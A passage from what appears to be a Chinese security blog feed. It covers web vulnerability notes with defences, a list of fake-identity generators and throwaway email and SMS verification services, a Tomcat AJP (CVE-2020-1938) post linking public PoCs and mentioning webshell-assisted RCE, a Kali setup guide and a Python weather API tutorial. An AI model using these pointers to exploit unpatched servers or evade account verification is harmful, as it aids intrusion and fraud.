title="出现原因"></a>出现原因</h5><pre><code>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</code></pre><h5 id="防范措施-4"><a href="#防范措施-4" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.PHP 中使用 open_basedir 配置限制访问在指定的区域2.过滤.（点）/（反斜杠）\（反斜杠）3.禁止服务器远程文件包含待补充</code></pre><h5 id="实战-3"><a href="#实战-3" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com /技能树/RCE/文件包含</code></pre><h5 id="7-csrf"><a href="#7-csrf" class="headerlink" title="(7) csrf"></a>(7) csrf</h5><p><code>一种劫持受信任用户向服务器发送非预期请求的攻击方式。</code></p><h5 id="危害-5"><a href="#危害-5" class="headerlink" title="危害"></a>危害</h5><pre><code>盗用用户身份，进行操作，涉及个人隐私和个人财产安全</code></pre><h5 id="分类-4"><a href="#分类-4" class="headerlink" title="分类"></a>分类</h5><p>请求类型来区分。</p><pre><code>GET类型POST类型</code></pre><p>按照攻击类型分类，</p><pre><code>HTML CSRF攻击，JSOM HiJacking攻击FIash CSRF攻击待补充</code></pre><h5 id="出现原因-5"><a href="#出现原因-5" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>请求所有的参数均可确定请求的审核不严格，如：只验证了Cookie</code></pre><h5 id="防范措施-5"><a href="#防范措施-5" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.使用Token（随机的值）验证2.判断请求的Referer头是否为正常的发送请求的页面3.使用验证码待补充</code></pre><h5 id="实战-4"><a href="#实战-4" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><h5 id="8-ssrf"><a href="#8-ssrf" class="headerlink" title="(8) ssrf"></a>(8) ssrf</h5><p><code>一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</code></p><h5 id="危害-6"><a href="#危害-6" class="headerlink" title="危害"></a>危害</h5><pre><code>盗用用户身份，进行操作，涉及个人隐私和个人财产安全</code></pre><h5 id="分类-5"><a href="#分类-5" class="headerlink" title="分类"></a>分类</h5><pre><code>待补充</code></pre><h5 id="出现原因-6"><a href="#出现原因-6" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。具体待补充</code></pre><h5 id="防范措施-6"><a href="#防范措施-6" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.禁止跳转2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）5.限制请求的端口为http常用的端口，比如 80、443、8080、80906.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。待补充</code></pre><h5 id="实战-5"><a href="#实战-5" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><h5 id="9-反序列化"><a href="#9-反序列化" class="headerlink" title="(9) 反序列化"></a>(9) 反序列化</h5><p><code>序列化是将运行时变量和程序对象转换成可以存储或传输的形式的过程。反序列化是将序列化形式转换回内存变量和程序对象的相反过程。序列化形式可以是基于文本的格式，例如JSON或XML，或二进制格式。许多高级的语言（如C＃，Java和PHP）都内置了对数据序列化的支持。</code></p><h5 id="危害-7"><a href="#危害-7" class="headerlink" title="危害"></a>危害</h5><pre><code>黑客可以利用它进行拒绝服务攻击、访问控制攻击和远程命令执行攻击。</code></pre><h5 id="分类-6"><a href="#分类-6" class="headerlink" title="分类"></a>分类</h5><pre><code>Java反序列化Python反序列化PHP反序列化等</code></pre><h5 id="出现原因-7"><a href="#出现原因-7" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</code></pre><h5 id="防范措施-7"><a href="#防范措施-7" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.进行完整性验证待补充</code></pre><h5 id="实战-6"><a href="#实战-6" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><p>漏洞待补充</p><p>如有错误，敬请指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>匿名邮箱、临时邮箱、短信平台</title>
      <link href="2020/04/21/%E5%8C%BF%E5%90%8D%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B9%B3%E5%8F%B0/"/>
      <url>2020/04/21/%E5%8C%BF%E5%90%8D%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="匿名邮箱、临时邮箱、短信平台"><a href="#匿名邮箱、临时邮箱、短信平台" class="headerlink" title="匿名邮箱、临时邮箱、短信平台"></a>匿名邮箱、临时邮箱、短信平台</h1><p><img src="http://img.ex1t.xyz/20201230172943.jpg">](</p><h2 id="匿名个人身份信息生成器"><a href="#匿名个人身份信息生成器" class="headerlink" title="匿名个人身份信息生成器"></a>匿名个人身份信息生成器</h2><p><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com/</a></p><p>Generate a Random Name - Fake Name Generator</p><p>国外的一个随机匿名身份信息生成器，可以生成一套包括姓名、性别、年龄、国家、身份证号、银行卡号、电话号码、邮箱地址、身高、体重、血型、车辆信息等的匿名身份资料，比较实用。</p><p><a href="http://www.haoweichi.com/">http://www.haoweichi.com/</a></p><p>国外随机身份信息生成器，可以生成美国、加拿大、日本、澳大利亚等身份信息，中文</p><h2 id="可以完全匿名注册的电子邮箱"><a href="#可以完全匿名注册的电子邮箱" class="headerlink" title="可以完全匿名注册的电子邮箱"></a>可以完全匿名注册的电子邮箱</h2><table><thead><tr><th>邮箱服务</th><th>网址</th></tr></thead><tbody><tr><td>ProtonMail</td><td><a href="https://protonmail.com/">https://protonmail.com/</a></td></tr><tr><td>mail.com</td><td><a href="https://www.mail.com/">https://www.mail.com/</a></td></tr></tbody></table><h2 id="临时、一次性、匿名邮箱"><a href="#临时、一次性、匿名邮箱" class="headerlink" title="临时、一次性、匿名邮箱"></a>临时、一次性、匿名邮箱</h2><table><thead><tr><th>网址</th><th>简介</th></tr></thead><tbody><tr><td><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a></td><td>临时电子邮箱,十分钟邮箱(10分钟),临时邮,临时Email,快速注册Email,24小时邮箱</td></tr><tr><td><a href="http://www.yopmail.com/">http://www.yopmail.com/</a></td><td>YOPmail 临时、匿名的免费邮箱地址。</td></tr><tr><td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td><td>10分钟邮箱: 安全免费的一次性临时电邮地址</td></tr><tr><td><a href="https://10minutemail.org/">https://10minutemail.org/</a></td><td>10分钟邮箱: 安全免费的一次性临时电邮地址</td></tr><tr><td><a href="https://linshiyou.com/">https://linshiyou.com/</a></td><td>临时邮箱,10分钟邮箱,24小时邮箱</td></tr><tr><td><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com/</a></td><td>Guerrilla Mail - Disposable Temporary E-Mail Address  <br>提示：ProtonMail 人机验证可用 guerrillamail.org 后缀。</td></tr><tr><td><a href="https://www.moakt.com/">https://www.moakt.com/</a></td><td>Moakt Email  临时邮箱专业服务</td></tr><tr><td><a href="https://temp-mail.org/">https://temp-mail.org/</a></td><td>Temp Mail - Disposable Temporary Email 支持中文，有安卓和ios客户端</td></tr><tr><td><a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a></td><td>Fake Mail Generator - Free temporary email addresses</td></tr><tr><td><a href="https://tempail.com/">https://tempail.com/</a></td><td>-</td></tr><tr><td><a href="https://mail-temp.com/">https://mail-temp.com/</a></td><td>-</td></tr><tr><td><a href="https://tempm.com/">https://tempm.com/</a></td><td>-</td></tr></tbody></table><h2 id="国内手机号、短信验证码平台"><a href="#国内手机号、短信验证码平台" class="headerlink" title="国内手机号、短信验证码平台"></a>国内手机号、短信验证码平台</h2><table><thead><tr><th>网址</th><th>简介</th></tr></thead><tbody><tr><td><a href="http://www.smszk.com/">http://www.smszk.com/</a></td><td>在线短信验证码接收，手机验证码短信接收平台，最好用的免费云短信网站！</td></tr><tr><td><a href="https://sms.cm/">https://sms.cm/</a></td><td>云短信 - 免费在线短信接收，国内免费临时手机号</td></tr><tr><td><a href="https://sms.cngrok.com/receiving-sms/">https://sms.cngrok.com/receiving-sms/</a></td><td>短信码上到-掠影网络，国内临时接码的</td></tr><tr><td><a href="https://www.becmd.com/">https://www.becmd.com/</a></td><td>免费接码 - 免费短信验证码接收平台</td></tr><tr><td><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a></td><td>云短信 - 在线短信接收 中国,美国,菲律宾</td></tr><tr><td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td><td>免费接短信,在线接收短信验证码 - 云短信帮助您从世界任何地方接收手机短信</td></tr><tr><td><a href="http://www.z-sms.com/">http://www.z-sms.com/</a></td><td>在线云短信</td></tr><tr><td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td><td>云短信-在线短信接收</td></tr><tr><td><a href="http://www.xnsms.com/">http://www.xnsms.com/</a></td><td>免费接码平台</td></tr><tr><td><a href="https://www.smsbo.com/">https://www.smsbo.com/</a></td><td>Receive SMS Online</td></tr></tbody></table><h2 id="国外手机号、短信验证码平台"><a href="#国外手机号、短信验证码平台" class="headerlink" title="国外手机号、短信验证码平台"></a>国外手机号、短信验证码平台</h2><table><thead><tr><th>网址</th><th>简介</th><th>接收地区</th></tr></thead><tbody><tr><td><a href="http://hs3x.com/">http://hs3x.com/</a></td><td>Receive SMS Online For Free - Free Virtual Numbers</td><td>美国,英国,奥地利,瑞典,比利时</td></tr><tr><td><a href="http://receivefreesms.com/">http://receivefreesms.com/</a></td><td>Receive FREE SMS online</td><td>美国,英国,挪威,瑞典,荷兰,澳大利亚,匈牙利,立陶宛,中国香港等</td></tr><tr><td><a href="http://receivefreesms.net/">http://receivefreesms.net/</a></td><td>Receive-SMS-Now</td><td>美国,加拿大,西班牙</td></tr><tr><td><a href="http://receiveonlinesms.biz/">http://receiveonlinesms.biz/</a></td><td>Receive Online SMS</td><td>美国,瑞典,挪威,西班牙,英国</td></tr><tr><td><a href="http://receiveonlinesms.com/">http://receiveonlinesms.com/</a></td><td>Receive SMS Online</td><td>国外免费临时手机号</td></tr><tr><td><a href="http://receive-sms-online.com/">http://receive-sms-online.com/</a></td><td>Receive SMS Online</td><td>俄国,英国,乌克兰</td></tr><tr><td><a href="http://receivesmsonline.in/">http://receivesmsonline.in/</a></td><td>Receive SMS Online</td><td>美国,加拿大,西班牙</td></tr><tr><td><a href="http://receivesmsverification.com/">http://receivesmsverification.com/</a></td><td>Receive SMS</td><td>比利时,英国,美国</td></tr><tr><td><a href="http://sms.sellaite.com/">http://sms.sellaite.com/</a></td><td>SELLAITE</td><td>爱沙尼亚</td></tr><tr><td><a href="http://www.freesmsverifications.com/">http://www.freesmsverifications.com/</a></td><td>Receive Free SMS</td><td>美国,英国,法国,波兰,比利时,加拿大</td></tr><tr><td><a href="http://www.receive-sms-now.com/">http://www.receive-sms-now.com/</a></td><td>Receive-SMS-Now</td><td>美国,加拿大,荷兰</td></tr><tr><td><a href="http://www.shejiinn.com/">http://www.shejiinn.com/</a></td><td>免费接码, 短信验证码,在线接收短信,接码平台</td><td>中国,缅甸,美国</td></tr><tr><td><a href="http://z-sms.com/">http://z-sms.com/</a></td><td>Z-SMS</td><td>中国,美国,缅甸,爱沙尼亚</td></tr><tr><td><a href="https://ch.freephonenum.com/">https://ch.freephonenum.com/</a></td><td>FreePhonenum  国外免费临时手机号（中文）</td><td>美国,加拿大(支持免费发短信)</td></tr><tr><td><a href="https://receive-a-sms.com/">https://receive-a-sms.com/</a></td><td>Receive a SMS Online</td><td>美国,澳大利亚,挪威,奥地利,巴西,中国香港,南非,波兰,英国,加拿大</td></tr><tr><td><a href="https://receive-sms.com/">https://receive-sms.com/</a></td><td>Receive-SMS</td><td>美国</td></tr><tr><td><a href="https://smsnumbersonline.com/">https://smsnumbersonline.com/</a></td><td>Free SMS Numbers Online</td><td>美国,英国,加拿大,波兰</td></tr><tr><td><a href="https://sms-online.co/receive-free-sms/">https://sms-online.co/receive-free-sms/</a></td><td>Receive SMS online for Free</td><td>美国,英国,加拿大,瑞典,法国,马来西亚,印度尼西亚</td></tr><tr><td><a href="https://sms-receive.net/">https://sms-receive.net/</a></td><td>SMS-Receive</td><td>俄罗斯,法国,罗马尼亚,西班牙,荷兰,英国</td></tr><tr><td><a href="https://smsreceivefree.com/">https://smsreceivefree.com/</a></td><td>SMSReceiveFree</td><td>美国,英国,加拿大</td></tr><tr><td><a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org/</a></td><td>Free Online Phone - 美国,加拿大,英国,瑞典</td><td></td></tr><tr><td><a href="https://www.pinger.com/text-free/">https://www.pinger.com/text-free/</a></td><td>Textfree</td><td>-</td></tr><tr><td><a href="https://www.receivesms.co/">https://www.receivesms.co/</a></td><td>Receive SMS Online</td><td>美国,奥地利,比利时,加拿大,瑞士,丹麦,西班牙,英国,意大利,波兰,葡萄牙,瑞典等</td></tr><tr><td><a href="https://www.receivesms.net/">https://www.receivesms.net/</a></td><td>Receive SMS Online - 国外免费临时手机号</td><td>-</td></tr><tr><td><a href="https://www.receive-sms-online.info/">https://www.receive-sms-online.info/</a></td><td>Receive SMS Online for FREE</td><td>英国,罗马尼亚,美国,西班牙,法国,德国,俄罗斯</td></tr><tr><td><a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net/</a></td><td>RECEIVE SMS ONLINE</td><td>美国,加拿大,英国</td></tr><tr><td><a href="https://www.textnow.com/">https://www.textnow.com/</a></td><td>TextNow</td><td>美国</td></tr><tr><td><a href="https://www.twilio.com/">https://www.twilio.com/</a></td><td>Twilio - 用于SMS，语音，视频和身份验证的通信API。支持API调用，看上去很不错。</td><td>-</td></tr><tr><td><a href="https://zh.mytrashmobile.com/">https://zh.mytrashmobile.com/</a></td><td>MyTrashmobile</td><td>美国,英国,加拿大</td></tr><tr><td><a href="https://www.zusms.com/">https://www.zusms.com/</a></td><td>在线免费短信接收平台</td><td>中国香港、美国、加拿大、中国</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2020-10487漏洞利用及POC</title>
      <link href="2020/02/22/cnvd-2020-10487%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8Apoc/"/>
      <url>2020/02/22/cnvd-2020-10487%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8Apoc/</url>
      
        <content type="html"><![CDATA[<h3 id="TOMCAT-简介"><a href="#TOMCAT-简介" class="headerlink" title="TOMCAT 简介"></a>TOMCAT 简介</h3><p>Apache Tomcat 是一个免费的开源 Web 应用服务器，在中小型企业和个人开发用户中有着广泛的应用。</p><h3 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h3><p>Apache Tomcat 中会默认开启一个为ajp的服务（默认端口8009），此服务的主要是使用二进制格式来传输可读性文本，换言之就是用来读取文件的。然而此服务中存在一处缺陷导致可以读取<strong>web目录</strong>下的文件，或者进行文件包含。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CNVD-2020-10487<br>CVE-2020-1938</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="http://img.ex1t.xyz/20201230172227.png"></p><h3 id="POC收集"><a href="#POC收集" class="headerlink" title="POC收集"></a>POC收集</h3><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/</a><br><a href="https://github.com/0nise/CVE-2020-1938">https://github.com/0nise/CVE-2020-1938</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>看到有大牛利用文件上传功能上传webshell，配合此漏洞进行rce操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> poc </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在VMware 15下安装kali 2019.4，并进行相关配置配置</title>
      <link href="2020/02/18/%E5%9C%A8vmware-15%E4%B8%8B%E5%AE%89%E8%A3%85kali-2019-4%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AE/"/>
      <url>2020/02/18/%E5%9C%A8vmware-15%E4%B8%8B%E5%AE%89%E8%A3%85kali-2019-4%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在VMware 15下安装kali 2019.4，并进行相关配置，安装vmware-tools、配置国内源、进行更新</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>镜像地址：<a href="http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso">http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso</a></p></li><li><p>虚拟机版本： vmware 15，下载地址：<a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a></p></li><li><p>虚拟机资源配置要求</p><ol><li>硬盘：60G</li><li>内存：大于等于2G</li><li>CPU：2核心，并在硬件中开启VT</li><li>UEFI模式，非传统bios</li></ol></li><li><p>安装过程参考<a href="http://note.youdao.com/noteshare?id=d8f0b81392a79db38c4635c50e4b54a8&amp;sub=E5AAD49F4CA842D8987324FB8523488A">kali 2020.1安装教程</a>和上课视频</p></li></ul><h2 id="KALI安装过程"><a href="#KALI安装过程" class="headerlink" title="KALI安装过程"></a>KALI安装过程</h2><ul><li><p>虚拟机配置部分略，参考上诉内容</p></li><li><p>具体安装过程</p><ol><li><p>选择Start installer进行安装<img src="http://img.ex1t.xyz/20201230170453.png"></p></li><li><p>选择语言<img src="http://img.ex1t.xyz/20201230170520.png" alt="选择语言"></p></li><li><p>选择地区<img src="http://img.ex1t.xyz/20201230170554.png" alt="选择地区"></p></li><li><p>配置键盘<img src="http://img.ex1t.xyz/20201230170619.png"></p></li><li><p>配置主机名，如kali2019<img src="http://img.ex1t.xyz/20201230170756.png"></p></li><li><p>配置域，建议为空<img src="http://img.ex1t.xyz/20201230170814.png"></p></li><li><p>配置密码，建议按照自己的使用习惯配置，或者直接配置成toor方便记忆<img src="http://img.ex1t.xyz/20201230170833.png"></p></li><li><p>磁盘分区，选择（向导-使用整个磁盘）<img src="http://img.ex1t.xyz/20201230170856.png"></p></li><li><p>配置分区，选择（将所有文件放在同一分区中）<img src="http://img.ex1t.xyz/20201230171312.png"><img src="http://img.ex1t.xyz/20201230171356.png"><img src="http://img.ex1t.xyz/20201230171441.png">配置软件包管理器，如果网络不好建议选择否，安装过程中网络断开会造成安装失败<img src="http://img.ex1t.xyz/20201230171504.png"></p></li><li><p>包管理自动配置过程中，如果无法配置成功，此时要进行如下操作，跳过包管理器的配置</p></li><li><p>安装结束重启</p><p><img src="http://img.ex1t.xyz/20201230171552.png"></p></li></ol></li></ul><h2 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h2><ul><li>安装vmware tools<ol><li>拷贝文件VMwareTools-*tar.gz到下载文件夹。<img src="http://img.ex1t.xyz/20201230172019.png"></li><li>在下载文件夹空白处右击–&gt; 在此处打开命令行，使用命令<code>tar -zxvf VMwareTools-*.tar.gz</code>,之后你回在下载文件夹中看到<img src="http://img.ex1t.xyz/20201230172106.png"></li><li>执行如下命令，进入文件夹vmware-tools-distrib，并执行安装程序，之后一路回车到底<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> vmware-tools-distrib./vmware-install.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>看到如下画面安装成功![图片上传中…]</li></ol></li><li>配置apt源<ol><li>使用命令编辑文件 <code>gedit /etc/apt/sources.list</code></li><li>添加如下内容到文件中，<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></li><li>更新软件源并更新软件,通过更新将操作系统软件更新到最新。  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update -y   <span class="token function">apt</span> upgrade -y --fix-missing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>安装并配置完成，可以正常使用，后面根据情况，在配置zsh和oh-my-zsh等。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> Vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3利用API查询天气及地理信息</title>
      <link href="2020/01/17/python3%E5%88%A9%E7%94%A8api%E6%9F%A5%E8%AF%A2%E5%A4%A9%E6%B0%94%E5%8F%8A%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF/"/>
      <url>2020/01/17/python3%E5%88%A9%E7%94%A8api%E6%9F%A5%E8%AF%A2%E5%A4%A9%E6%B0%94%E5%8F%8A%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  在学习python的过程中，看到利用api接口的练习，就写了这么一个功能模块，可以通过ip地址/城市名称/城市标识ID/auto_ip等查询天气和地理信息。</p></blockquote><h2 id="API-amp-KEY"><a href="#API-amp-KEY" class="headerlink" title="API&amp;KEY"></a>API&amp;KEY</h2><p>鉴于本次是查询天气状态 并且中国天气网现已没有再提供API接口，所以我找到了和风天气平台，当然你也可以另寻其他API接口，只要注册登录拿到相关的key就可以。</p><p><img src="http://img.ex1t.xyz/20201230165558.png"></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p><img src="http://img.ex1t.xyz/20201230165633.png"></p><h2 id="url中的参数说明"><a href="#url中的参数说明" class="headerlink" title="url中的参数说明"></a>url中的参数说明</h2><p> <strong>weather_type</strong><br> <img src="http://img.ex1t.xyz/20201230165708.png">&gt;<strong>parameters</strong><br> <img src="http://img.ex1t.xyz/20201230165728.png"><br> 其他具体参数（天气相关）说明  <a href="https://dev.heweather.com/docs/api/weather" title="https://dev.heweather.com/docs/api/weather ">https://dev.heweather.com/docs/api/weather </a></p><h2 id="requests获取信息"><a href="#requests获取信息" class="headerlink" title="requests获取信息"></a>requests获取信息</h2><p>使用的是免费版本的url,数据格式是json</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s"</span> \          <span class="token operator">%</span> <span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">,</span> key<span class="token punctuation">)</span> page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 得到json格式数据</span>page <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>page<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># 将str转化为dict类型，方便处理数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个小知识点<br>json.dumps()和json.loads()是json格式处理函数（可以这么理解，json是字符串）</p><ol><li>json.dumps()函数是将一个Python数据类型列表进行json格式的编码（可以这么理解，json.dumps()函数是将字典转化为字符串）</li><li>json.loads()函数是将json格式数据转换为字典（可以这么理解，json.loads()函数是将字符串转化为字典）</li></ol><p>利用这个字典数据提取出相关信息。<br>如：获取经纬度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"经度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"纬度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="实况天气查询"><a href="#实况天气查询" class="headerlink" title="实况天气查询"></a>实况天气查询</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonweather_type <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">,</span> <span class="token string">'forecast'</span><span class="token punctuation">,</span> <span class="token string">'hourly'</span><span class="token punctuation">,</span> <span class="token string">'lifestyle'</span><span class="token punctuation">]</span>  <span class="token comment"># 实况天气,3-10天预报,逐小时预报,生活指数</span><span class="token triple-quoted-string string">"""parameters形式 1. location=CN101010100 （城市ID）2. location=116.40,39.9  （经纬度格式）3. location=北京、 location=北京市、 location=beijing （城市）4. location=朝阳,北京、 location=chaoyang,beijing  (详细地名)5. location=60.194.130.1  （ip）6. location=auto_ip （根据请求自动判断，根据用户的请求获取IP，通过 IP 定位并获取城市数据）"""</span>key <span class="token operator">=</span> <span class="token string">'551bd5df607546dc136ada2ba9f82280'</span>   <span class="token comment"># 这里的key并不真实，我改了一下，想尝试请自行注册</span><span class="token keyword">def</span> <span class="token function">get_weather</span><span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s"</span> \          <span class="token operator">%</span> <span class="token punctuation">(</span>weather_type<span class="token punctuation">,</span> parameters<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token comment"># 和风天气平台API</span>    page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment"># print(page.text)</span>    page <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>page<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(page, "\n", type(page))</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"经度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lon'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"纬度"</span><span class="token punctuation">,</span> page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'basic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'lat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> weather_type <span class="token operator">==</span> <span class="token string">'now'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        现在播放%s的实况天气：当前体感温度为%s摄氏度，天气状况%s，%s风向，风力%s级，风速每%s公里/时，相对湿度%%%s，大气压强为%s,能见度%s公里，云量%s        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>parameters<span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token 